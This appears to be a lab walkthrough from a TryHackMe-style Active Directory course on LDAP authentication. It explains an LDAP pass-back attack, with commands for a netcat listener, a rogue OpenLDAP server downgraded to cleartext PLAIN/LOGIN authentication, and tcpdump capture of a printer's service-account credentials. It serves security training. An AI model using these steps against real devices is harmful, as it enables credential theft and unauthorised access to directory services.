# LDAP Authentication in Active Directory

## Overview

Lightweight Directory Access Protocol (LDAP) is another method of Active Directory (AD) authentication used by applications. Unlike NTLM, LDAP authentication allows the application to directly verify user credentials. Typically, the application uses a pair of AD credentials to query LDAP and then validate the user's credentials.

LDAP authentication is popular among third-party (non-Microsoft) applications that integrate with AD, such as:

- GitLab
- Jenkins
- Custom-developed web applications
- Printers
- VPNs

If these services are exposed to the internet, they are susceptible to attacks similar to those targeting NTLM authentication. However, since LDAP authentication requires a set of AD credentials, attackers may attempt to recover these credentials to gain authenticated access to AD.

## Credential Recovery via Configuration Files

If you gain access to a host (e.g., a GitLab server), you may be able to recover AD credentials by reading configuration files. These credentials are often stored in plain text, relying on the security of the file location rather than its contents. Configuration file security is discussed further in Task 7.

---

## LDAP Pass-back Attacks

An LDAP Pass-back attack targets LDAP authentication mechanisms, commonly against network devices like printers after gaining internal network access (e.g., via a rogue device).

### Attack Scenario

If you access a device's configuration (such as a printer's web interface), you may not be able to extract the LDAP password directly, but you can alter the LDAP server IP/hostname. By pointing the LDAP server configuration to your own IP and triggering a test, the device will attempt to authenticate to your rogue server, allowing you to intercept the credentials.

**Example:**  
Navigate to `http://printer.za.tryhackme.com/settings.aspx` to access the printer's settings page.

- The username may be visible, but the password is hidden.
- When "Test Settings" is pressed, the device attempts LDAP authentication.

### Initial Test with Netcat

Set up a Netcat listener on port 389 (LDAP):

```bash
nc -lvp 389
```

> **Note:** If using AttackBox, stop slapd first:  
> `service slapd stop`

Update the printer's LDAP server setting to your VPN IP (find it with `ip a`). Press "Test Settings" to trigger the connection.

**Expected Output:**

```
[thm@thm]$ nc -lvp 389
listening on [any] 389 ...
10.10.10.201: inverse host lookup failed: Unknown host
connect to [10.10.10.55] from (UNKNOWN) [10.10.10.201] 49765
...
```

However, Netcat alone cannot capture credentials, as the device negotiates the authentication method and may not send credentials in cleartext.

---

## Hosting a Rogue LDAP Server

To capture credentials, set up a rogue LDAP server supporting only insecure authentication methods (PLAIN and LOGIN).

### Install and Configure OpenLDAP

If not already installed:

```bash
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```

Reconfigure OpenLDAP:

```bash
sudo dpkg-reconfigure -p low slapd
```

- Set DNS domain and Organisation name to `za.tryhackme.com`
- Choose any Administrator password
- Select MDB as the database
- Do not remove the database when purged
- Move old database files before creating a new one

### Downgrade Authentication Mechanisms

Create `olcSaslSecProps.ldif`:

```ldif
# olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

Apply the configuration:

```bash
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

Verify supported mechanisms:

```bash
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```

Expected output:

```
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN
```

---

## Capturing LDAP Credentials

With the rogue LDAP server running, press "Test Settings" on the printer's web interface. If configured correctly, you should see an error like "This distinguished name contains invalid syntax"—this means the credentials were sent in cleartext.

Capture the credentials using `tcpdump`:

```bash
sudo tcpdump -SX -i breachad tcp port 389
```

Look for the username and password in the captured packets (e.g., `za.tryhackme.com\svcLDAP` and `password11`).

> **Note:** The actual password will differ. You may need to press "Test Settings" multiple times for the credentials to appear.

---

## Summary

By exploiting LDAP authentication and downgrading the authentication mechanism, you can intercept AD credentials in cleartext using a rogue LDAP server and packet capture tools.
